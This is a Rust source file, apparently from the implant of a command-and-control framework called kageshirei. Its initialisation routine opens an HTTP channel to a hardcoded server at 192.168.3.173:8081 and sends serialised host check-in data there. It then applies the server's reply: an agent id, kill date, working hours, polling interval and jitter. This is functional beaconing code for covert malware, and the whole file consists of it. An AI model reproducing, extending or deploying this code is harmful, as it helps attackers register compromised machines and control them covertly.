use alloc::sync::Arc;
use core::ffi::c_void;
use std::collections::BTreeMap;

use kageshirei_communication_protocol::{
    communication::CheckinResponse,
    error::{Format as FormatError, Protocol as ProtocolError},
    Format as _,
    Protocol as _,
};
use kageshirei_format_json::FormatJson;
use kageshirei_runtime::Runtime;
use libc_print::libc_eprintln;
use mod_agentcore::{instance, instance_mut};
#[cfg(feature = "proto-http-winhttp")]
use mod_protocol_http::HttpProtocol;

use super::system_data::checkin_from_raw;

/// Initializes the communication protocol and attempts to connect to the server.
pub fn initialize_protocol<R>(rt: Arc<R>)
where
    R: Runtime,
{
    #[cfg(feature = "proto-http-winhttp")]
    {
        let boxed_protocol: Box<HttpProtocol> = Box::new(HttpProtocol::new("http://192.168.3.173:8081".to_owned()));
        let boxed_formatter: Box<FormatJson> = Box::new(FormatJson);

        unsafe {
            instance_mut().session.protocol_ptr = Box::into_raw(boxed_protocol) as *mut c_void;
            instance_mut().session.formatter_ptr = Box::into_raw(boxed_formatter) as *mut c_void;
        }

        unsafe {
            let protocol = protocol_from_raw(instance().session.protocol_ptr);
            let formatter = formatter_from_raw(instance().session.formatter_ptr);

            // Check if the Checkin data is available in the global instance
            if let Some(checkin_ptr) = instance().pcheckindata.as_mut() {
                // Convert the raw pointer to a mutable reference to Checkin
                let checkin_data = checkin_from_raw(checkin_ptr);

                // Set the protocol to checkin mode
                // protocol.set_is_checkin(true);

                match formatter.write(checkin_data, None::<BTreeMap<&str, &str>>) {
                    Ok(data) => {
                        let result: Result<Vec<u8>, ProtocolError> =
                            rt.block_on(async { protocol.send(data, None).await });

                        match result {
                            Ok(response) => {
                                match formatter.read::<CheckinResponse, FormatError>(
                                    response.as_slice(),
                                    None::<BTreeMap<&str, FormatError>>,
                                ) {
                                    Ok(checkin_response) => {
                                        instance_mut().config.id = checkin_response.id;
                                        instance_mut().config.kill_date = checkin_response.kill_date;
                                        instance_mut().config.working_hours = checkin_response.working_hours;
                                        instance_mut().config.polling_interval = checkin_response.polling_interval;
                                        instance_mut().config.polling_jitter = checkin_response.polling_jitter;

                                        // If successful, mark the session as connected
                                        instance_mut().session.connected = true;
                                    },
                                    Err(_) => {
                                        libc_eprintln!("Format error checkin response data");
                                    },
                                }
                            },
                            Err(_) => {
                                libc_eprintln!("Protocol error");
                            },
                        }
                    },
                    Err(_) => {
                        libc_eprintln!("Format error checkin data");
                    },
                }
            }
            else {
                libc_eprintln!("Error: Checkin data is null");
            }
        }
    }
}

#[cfg(feature = "proto-http-winhttp")]
/// Function to retrieve a mutable reference to a JsonProtocl<IdentEncryptor> struct from a raw
/// pointer.
///
/// # Safety
/// - This function is marked `unsafe` because it dereferences a raw pointer.
pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut HttpProtocol { &mut *(ptr as *mut HttpProtocol) }

/// Function to retrieve a mutable reference to a FormatJson struct from a raw pointer.
///
/// # Safety
/// - This function is marked `unsafe` because it dereferences a raw pointer.
pub unsafe fn formatter_from_raw(ptr: *mut c_void) -> &'static mut FormatJson { &mut *(ptr as *mut FormatJson) }
